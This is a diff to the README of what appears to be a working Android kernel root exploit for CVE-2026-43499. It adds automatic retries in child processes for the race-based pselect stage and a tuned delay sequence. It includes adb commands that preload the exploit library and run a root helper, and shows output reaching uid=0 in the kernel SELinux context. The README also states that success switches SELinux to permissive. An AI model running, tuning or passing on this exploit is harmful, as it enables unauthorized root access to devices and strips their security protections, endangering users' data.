@@ -42,6 +42,8 @@ The upstream Apache License 2.0 is retained in [LICENSE](LICENSE).
   arbitrary read/write primitive.
 - Retains reclaimed pages in a detached `cve43499-hold` process after success
   so dangling kernel references cannot be recycled into unrelated slab objects.
+- Runs failed race attempts in independent child processes and automatically
+  retries with a device-tuned pselect delay sequence.
 
 ## Build
 
@@ -73,6 +75,22 @@ adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
 adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
 ```
 
+The default run makes up to 16 independent attempts. Each failed child exits
+before the next attempt, so its file descriptors and heap-shaping allocations
+are released instead of accumulating inside one long-lived exploit process.
+The default base delay is `20000` microseconds and the supervisor sweeps the
+following sequence twice:
+
+```text
+20000, 30000, 50000, 25000, 40000, 15000, 60000, 35000
+```
+
+Override the attempt count or base delay when collecting timing data:
+
+```sh
+adb shell "EXPLOIT_ATTEMPTS=24 PSELECT_DELAY_USEC=20000 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
+```
+
 Verified result on `S938NKSUACZF1`:
 
 ```text
@@ -82,10 +100,9 @@ stability keeper pid=<pid> retaining reclaimed kernel pages
 uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
 ```
 
-The initial pselect stage is race-based. A run that exits with `root=0`
-before reaching the physical read/write stage can be retried. Successful
-execution switches SELinux to permissive and starts the root helper until the
-next reboot.
+The initial pselect stage is race-based. A child that exits with `root=0`
+is retried automatically. Successful execution switches SELinux to permissive
+and starts the root helper until the next reboot.
 
 ## Stability keeper
 
